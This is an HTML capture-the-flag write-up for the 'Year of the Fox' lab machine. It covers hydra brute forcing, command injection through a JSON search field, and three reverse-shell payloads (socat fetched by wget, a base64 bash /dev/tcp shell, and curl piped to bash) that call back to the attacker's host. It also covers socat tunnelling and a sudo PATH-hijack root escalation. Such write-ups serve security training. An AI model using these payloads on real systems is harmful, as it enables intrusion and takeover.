<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>year of the fox</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>year of the fox</h1><br/><strong><h1>Year of the Fox</h1></strong><br /><br /><br /><strong><h2>Enumeration</h2></strong><br /><br /><strong>Rustscan for Open Ports:</strong><br /><img src="images/50-1.png" alt="images/50-1.png" /><br /><br /><strong>Nmap with Specific Ports:</strong><br /><img src="images/50-2.png" alt="images/50-2.png" /><br /><br />At this point, we see there are 3 open ports. Generally speaking we have 2 ways to access the machine <strong>Samba</strong> &amp; <strong>Webserver</strong>.<br /><br /><strong>Webserver Enumeration:</strong><br /><img src="images/50-3.png" alt="images/50-3.png" /><br /><br />When I opened the website, it asks for credentials. I checked the request in burpsuite. We have a simple <strong>GET</strong> request in the begining.<br /><img src="images/50-4.png" alt="images/50-4.png" /><br /><br />Once I forward this, we are presented with the Login Page. This is a <strong>header based form</strong> which uses <strong>GET</strong> request. When I entered username as <strong>admin</strong> &amp; password as <strong>password</strong> as a dummy request. The following is the request. <br /><br /><strong>Note:</strong> It uses Basic Authorization that converts the username &amp; password to base64.<br /><br /><img src="images/50-5.png" alt="images/50-5.png" /><br /><br />This is a <strong>header based form</strong> which uses <strong>GET</strong> request.<br />We can decode the Base64 string to be sure.<br /><br /><img src="images/50-6.png" alt="images/50-6.png" /><br /><br />This base64 string must be verified in the server side. Currently we do not have any credentials. So lets continue our enumeration.<br /><br /><strong>Samba Enumeration:</strong><br /><br /><span style="text-decoration:underline;">smbclient:</span><br /><br /><img src="images/50-7.png" alt="images/50-7.png" /><br /><br />I enumerated to list the samba shares. I found an intresting share called <strong>yotf</strong>. However, its not accessible without any credentials.<br />I checked guest Login was also disabled.<br />I will use <strong>enum4linux</strong> to get maximum information about the system from the samba share.<br /><br /><span style="text-decoration:underline;">enum4linux:</span><br /><img src="images/50-8.png" alt="images/50-8.png" /><br /><br /><img src="images/50-9.png" alt="images/50-9.png" /><br /><br />As we can see above, we found 2 users.<br /><br /><strong>Users Found:</strong><br /><em>fox<br />rascal</em><br /><br /><br />After checking each avenue, we conclude that at this point, the CTF needs brute force. We can either choose to <strong>Brute force</strong> the <strong>Website</strong> or the <strong>Samba share</strong> with the known users above.<br /><strong>Note:</strong> I tried various things, and finally we found a way by brute forcing the website with the user rascal.<br /><br /><strong>Website Brute forcing:</strong><br />Link:<strong> </strong><a href="https://github.com/gnebbia/hydra_notes">https://github.com/gnebbia/hydra_notes</a><br />I will use hydra to brute force http-get request. We can use any of the following syntax.<br /><br /><strong>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-get</strong><br /><strong>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-get /</strong><br /><strong>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-head<br />hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-head /</strong><br /><br /><img src="images/50-10.png" alt="images/50-10.png" /><br /><br /><strong>Credentials Found:</strong><br /><em>Username: 	rascal<br />Password: 	hello2u</em><br /><br /><br /><strong>Website Enumeration Contd:</strong><br />I used the above credentials and continued the website enumeration.<br /><img src="images/50-11.png" alt="images/50-11.png" /><br /><br />We landed on a page called <strong>Rascal&#39;s Search System</strong>. I clicked on search without any arguments.<br /><img src="images/50-12.png" alt="images/50-12.png" /><br /><br />We could see some files. I also noticed there is a <strong>Client Side Filter</strong> in place that prevents certain keyboard entries like / &amp; any special charecters.<br />We should be able to bypass the <strong>Client Side Filter</strong> by using <strong>burpsuite</strong> and capturing the request in the <strong>repeater</strong>.<br /><br /><strong>Burpsuite Website Analysis:</strong><br />I entered a dummy search ‘abcdef’ and captured the request in Burpsuite.<br /><img src="images/50-13.png" alt="images/50-13.png" /><br /><br />Lets send this to <strong>repeater</strong> and continue our analysis.<br /><br /><img src="images/50-14.png" alt="images/50-14.png" /><br /><br />After researching a lot I found that the following payloads were working for command injection. However, we won&#39;t get the output on the webpage (For the 1st Payload) so we will use ping command and verify with wireshark/tcpdump.<br /><br />The 2nd Payload: Shows output on the webpage.<br /><br /><span style="text-decoration:underline;">Payload 1:</span><strong> \&quot;;pwd \&quot;</strong><br /><span style="text-decoration:underline;">Payload 2:</span> <strong>\&quot;;pwd\n</strong><br /><br /><strong>Note:</strong> Both the payloads have to be inserted inside the  <strong>double quotes</strong>: “abcdef&quot;.<br />Replace abcdef with our payload<br /><br /><strong>Payload 2:</strong><br />Using Payload 2 we can see the result in the website. So I will use the <strong>pwd</strong> command.<br /><br /><strong>{<br />&quot;target&quot;:&quot;\&quot;;pwd\n&quot;<br />}</strong><br /><br /><img src="images/50-15.png" alt="images/50-15.png" /><br /><br /><strong>Payload 1:</strong><br />Using Payload 1 as we cannot see the results in the webpage. I will use <strong>ping</strong> command and <strong>tcpdump</strong>.<br /><br /><strong>{<br />&quot;target&quot;:&quot;\&quot;;ping -c 1 10.11.72.31;\&quot;&quot;<br />}</strong><br /><br /><img src="images/50-16.png" alt="images/50-16.png" /><br /><br />Verified that Ping from the target is reaching us.<br /><strong>tcpdump ip proto \\icmp -i tun0</strong><br /><img src="images/50-17.png" alt="images/50-17.png" /><br /><br />Therefore, we have successfully achieved RCE (Remote Command Execution) on the target machine.<br /><br /><strong><h2>Foothold</h2></strong><br /><br />From here, we should easily be able to get a reverse shell connection from the target machine using our RCE exploit. <br />However, I faced another problem. There is a <strong>Server Side Filter</strong> that prevents certain keys like <strong>$</strong>..etc<br /><br />I tried <strong>bash reverse shell</strong>, <strong>nc reverse shell</strong>.<br />Both of them didn&#39;t work.<br /><br /><strong>Working Solutions(3):</strong><br /><span style="text-decoration:underline;">Solution-1</span>: We can host a local <strong>socat</strong> binary in<strong> local webserver</strong> and <strong>get</strong> it <strong>to</strong> the <strong>machine</strong> and run it to create a <strong>socat reverse shell</strong>.<br /><br /><strong>Latest Version - 1.7.4.3</strong><br /><a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat</a> <strong>(Version - 1.7.3.0)</strong><br /><a href="https://github.com/3ndG4me/socat/releases">https://github.com/3ndG4me/socat/releases</a> <strong>(Version - 1.7.3.3)<br /><br /></strong><strong><span style="text-decoration:underline;">Important Note:</span></strong><strong> </strong>The Latest version of Socat requires <strong>libssl.so.3 </strong>library file to run. However, the file is not present in the target machine. I have cheked. Thus, we need to use an <strong>older</strong> <strong>version</strong> of <strong>socat</strong> for this CTF.<br /><br />Any one from the above links will work.<strong><br /></strong><br /><img src="images/50-18.png" alt="images/50-18.png" /><br /><br />{<br /><strong>&quot;target&quot;:&quot;\&quot;; wget -q </strong><a href="http://10.11.72.31/socat">http://10.11.72.31/socat</a><strong> -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#39;bash -li&#39;,pty,stderr,sigint,setsid,sane tcp:10.11.72.31:5555; \n&quot;</strong><br />}<br /><br /><img src="images/50-19.png" alt="images/50-19.png" /><br /><br /><br /><span style="text-decoration:underline;">Solution-</span>2: We can <strong>encode</strong> the above not working <strong>bash/nc reverse shell</strong> in <strong>base64</strong> and <strong>decode</strong> them in <strong>server side</strong> then pipe to <strong>bash</strong>.<br /><br />I encoded the bash reverse shell: <strong>/bin/bash -i &gt;&amp; /dev/tcp/10.11.72.31/6666 0&gt;&amp;1</strong><br /><img src="images/50-20.png" alt="images/50-20.png" /><br /><br /><br /><strong>{<br />&quot;target&quot;:&quot;\&quot;; echo &#39;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjExLjcyLjMxLzY2NjYgMD4mMQ==&#39; | base64 -d | bash \n&quot;<br />}</strong><br /><br /><img src="images/50-21.png" alt="images/50-21.png" /><br /><br /><span style="text-decoration:underline;">Solution-</span>3: We can use a <strong>shell script</strong> having <strong>bash reverse shell</strong> hosted in <strong>local webserver</strong> and <strong>get</strong> it <strong>to</strong> the <strong>machine</strong> and <strong>run</strong> the <strong>script</strong>.<br /><br /><img src="images/50-22.png" alt="images/50-22.png" /><br /><br /><strong>{<br />&quot;target&quot;:&quot;\&quot;; curl </strong><a href="http://10.11.72.31/rev.sh">http://10.11.72.31/rev.sh</a><strong> | bash \n&quot;<br />}</strong><br /><br /><img src="images/50-23.png" alt="images/50-23.png" /><br /><br /><br />We then find the web flag in the following directory.<br /><img src="images/50-24.png" alt="images/50-24.png" /><br /><br /><strong><h2>Privilege Escalation</h2></strong><br /><br />Running the <strong>netstat</strong> command gives us an intresting result.<br /><br /><img src="images/50-25.png" alt="images/50-25.png" /><br /><br /><strong>SSH</strong> is running on the machine on port 22. However, it is only accessible to <strong>localhost</strong>(127.0.0.1).<br />Any external communication to port 22 is thus blocked by the firewall.<br /><br />Here we will use <strong>Socat</strong> to <strong>Tunnel</strong> the <strong>localhost:22</strong> to a different selected <strong>unsed port</strong> on the machine say <strong>9090</strong>.<br />Once the Tunnel is successful, attacker can connect to port <strong>9090</strong> --→ which will be tunneled to <strong>localhost:22</strong>. <br />Thus access the<strong> SSH server </strong>on port <strong>9090</strong>.<br /><br /><strong><h3>Socat Tunnelling:</h3></strong><br />I will use the socat binary i uploaded in the Foothold process. (<strong>Solution-1</strong>).<br /><br /><strong>socat tcp-listen:9090,reuseaddr,fork tcp:localhost:22</strong><br /><br /><img src="images/50-26.png" alt="images/50-26.png" /><br /><br />Now From my machine we test if the tunneling was successful.<br />I used <strong>Nmap</strong> scan to test.<br /><br /><img src="images/50-27.png" alt="images/50-27.png" /><br /><br />As we can see, our tunneling was successful.<br /><br />Next, I look the following file to know about SSH users.<br /><strong>/etc/ssh/sshd_config</strong><br /><br /><strong>more /etc/ssh/sshd_config</strong><br /><img src="images/50-28.png" alt="images/50-28.png" /><br /><br /><br />Next I <strong>brute force</strong> the <strong>SSH</strong> user <strong>fox</strong> with <strong>hydra</strong><br /><br /><strong>SSH Brute forcing:</strong><br />The following hydra command is used.<br /><br /><strong>hydra -l fox -P /usr/share/wordlists/rockyou.txt -s 9090 10.10.35.159 ssh</strong><br /><br /><img src="images/50-29.png" alt="images/50-29.png" /><br /><br />Thus, we found a SSH credential.<br /><br /><strong>SSH Credentials Found</strong><br />Username:	<strong>fox</strong><br />Password:	<strong>ginger</strong><br /><br /><br /><strong><h3>Lateral Movement-1:</h3></strong><br />We login into fox user using the SSH tunnel.<br /><br /><strong>ssh fox@10.10.35.159 -p 9090</strong><br /><br /><img src="images/50-30.png" alt="images/50-30.png" /><br /><br />Next, we get the user flag in the home directory.<br /><img src="images/50-31.png" alt="images/50-31.png" /><br /><br />Lets check sudo on the Target Machine:<br /><img src="images/50-32.png" alt="images/50-32.png" /><br /><br />Normal Sudo<br /><img src="images/50-33.png" alt="images/50-33.png" /><br /><br />As we can see, the <strong>secure_path</strong> is not present on the target machine. This means if any executible uses any program without absolute path. We can use this to plant our program in a different path.<br /><br />Lets examine the <strong>/usr/sbin/shutdown</strong> binary by taking it to kali machine.<br /><br /><span style="text-decoration:underline;">Target Machine</span>: <strong>cp /usr/sbin/shutdown /tmp</strong><br /><span style="text-decoration:underline;">Attacker Machine</span>: <strong>scp -P 9090 fox@10.10.93.57:/tmp/shutdown .</strong><br /><br /><strong><span style="text-decoration:underline;">Examine the Shutdown Binary using radare2:</span></strong><br /><br /><strong>radare2 -AAA &lt;Filename&gt;<br />pdf @main</strong><br /><br /><img src="images/50-34.png" alt="images/50-34.png" /><br /><br />As we can see, the <strong>poweroff</strong> is called <strong>without absoulute path</strong>.<br />We need to copy the <strong>/bin/bash</strong> binary to <strong>/tmp</strong> and rename as <strong>poweroff</strong> and <strong>add the /tmp path</strong> while calling the <strong>shutdown using sudo</strong>.<br /><br /><strong>cp /bin/bash /tmp/poweroff</strong><br /><br />Then run the sudo command along with PATH as follows:<br /><br /><strong>sudo &quot;PATH=/tmp:$PATH&quot; /usr/sbin/shutdown</strong><br /><br /><img src="images/50-35.png" alt="images/50-35.png" /><br /><br />Thus, we have root access &amp; can get the root flag.<br /><br /><img src="images/50-36.png" alt="images/50-36.png" /><br /><br />I searched for root flag in the /root directory but it contained a text <strong>“Not here -- go find!”</strong><br />Thus I used a <strong>find</strong> command to try locate the flag.<br /><br /><strong>find / -type f -name &quot;*flag*&quot; 2&gt;/dev/null</strong><br /><br />But it didn&#39;t find any result.<br />Finally I used the followng find command to get the flag.<br /><br /><strong>find / -type f -name &quot;*root*&quot; 2&gt;/dev/null</strong><br /><br /><img src="images/50-37.png" alt="images/50-37.png" /><br /><br />Thus,we get the root flag.<br /><img src="images/50-38.png" alt="images/50-38.png" /><br /><br />Thanks!!</div>
</body>
</html>
